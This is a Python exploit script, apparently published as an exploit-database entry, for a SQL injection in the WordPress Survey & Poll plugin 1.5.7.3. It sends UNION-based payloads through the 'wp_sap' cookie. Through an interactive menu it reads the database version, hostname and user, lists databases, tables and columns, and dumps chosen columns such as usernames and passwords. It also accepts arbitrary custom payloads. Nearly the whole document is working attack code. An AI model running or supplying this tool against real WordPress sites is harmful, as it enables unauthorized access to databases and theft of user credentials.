# Exploit Title: WordPress Plugin Survey & Poll 1.5.7.3 - 'sss_params' SQL Injection (2)
# Date: 2021-09-07
# Exploit Author: Mohin Paramasivam (Shad0wQu35t)
# Vendor Homepage: http://modalsurvey.pantherius.com/
# Software Link: https://downloads.wordpress.org/plugin/wp-survey-and-poll.zip
# Version: 1.5.7.3
# Tested on: MariaDB,MYSQL

#!/usr/bin/python3

import requests
import re
import warnings
from bs4 import BeautifulSoup, CData
import sys
import argparse
import os
import time
from termcolor import colored
import validators

#Install all the requirements

"""
pip3 install requests
pip3 install bs4
pip3 install argparse
pip3 install termcolor
pip3 install validators

"""


parser = argparse.ArgumentParser(description='WP Plugin Survey & Poll V1.5.7.3 SQL Injection (sss_params)')
parser.add_argument('-u',help='Poll & Survey page URL')
args = parser.parse_args()

url = args.u


if len(sys.argv) !=3:
    parser.print_help(sys.stderr)
    sys.exit()

if not validators.url(url):
	print(colored("\r\nEnter URL with http:// or https://\r\n",'red'))
	parser.print_help(sys.stderr)
	sys.exit()


def currect_db_name():
	payload= """["1650149780')) OR 1=2 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,database(),11#"]"""
	inject(payload)


def db_version():
	payload = """["1650149780')) OR 1=2 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,@@version,11#"]"""
	inject(payload)


def hostname():
	payload = """["1650149780')) OR 1=2 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,@@hostname,11#"]"""
	inject(payload)


def current_user():
	payload = """["1650149780')) OR 1=2 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,user(),11#"]"""
	inject(payload)


def list_databases():
	payload = """["1650149780')) OR 1=2 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,group_concat(schema_name),11 from information_schema.schemata#"]"""
	inject(payload)

def list_tables_db():
	db = input("\r\nDatabase : ")
	payload = """["1650149780')) OR 1=2 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,group_concat(table_name),11 from information_schema.tables where table_schema='%s'#"]""" %(db)
	inject(payload)


def list_columns_db():
	db = input("\r\nDatabase : ")
	table = input("Table : ")
	payload = """["1650149780')) OR 1=2 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,group_concat(column_name),11 from information_schema.columns where table_schema='%s' and table_name='%s'#"]""" %(db,table)
	inject(payload)


def dump_db():
	db = input("\r\nDatabase: ")
	table = input("Table: ")
	column = input("Columns Eg: users,password : ")
	dump = "%s.%s" %(db,table)
	payload = """["1650149780')) OR 1=2 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,group_concat(%s),11 from %s.%s#"]""" %(column,db,table)
	inject(payload)


def custom_payload():
	payload = input("\r\nPayload : ")
	inject(payload)

def inject(inject_payload):

	request = requests.Session()

	cookies = {
		    'wp_sap': inject_payload,

		}
	print("\r\n"+colored("Sending Payload :",'red')+" %s\r\n" %colored((inject_payload),'green'))
	response = request.get(url,cookies=cookies)
	warnings.filterwarnings("ignore", category=UserWarning, module='bs4')
	soup = BeautifulSoup(response.text,features="lxml")
	cdata = soup.find(text=re.compile("CDATA"))
	split_cdata = list(cdata.split(':'))
	output = split_cdata[11]
	print("\r\n"+colored("SQLI OUTPUT :",'red')+" %s\r\n" %colored((output),'green'))
	time.sleep(1)
	main()



def main():
	print ("Automated SQL Injector (wp-survey-and-poll)")
	print ("Enter the respective number to select option")
	print ("#EXAMPLE Option : 1\r\n")



	print("Option 1 : Grab Database Version")
	print("Option 2 : Get Current Database Name")
	print("Option 3 : Get Hostname ")
	print("Option 4 : Get Current User")
	print("Option 5 : List All Databases")
	print("Option 6 : List Tables From Database")
	print("Option 7 : List Columns from Tables")
	print("Option 8 : Dump Database")
	print("Option 9 : Custom Payload")
	print("Option 10 : Exit")


	print("\r\n")
	option_selected = str(input("Select Option : "))


	if(option_selected=="1"):
		db_version()

	if(option_selected=="2"):
		currect_db_name()

	if(option_selected=="3"):
		hostname()

	if(option_selected=="4"):
		current_user()

	if(option_selected=="5"):
		list_databases()

	if(option_selected=="6"):
		list_tables_db()

	if(option_selected=="7"):
		list_columns_db()

	if(option_selected=="8"):
		dump_db()

	if(option_selected=="9"):
		custom_payload()

	if(option_selected=="10"):
		sys.exit()

	else:
		main()

main()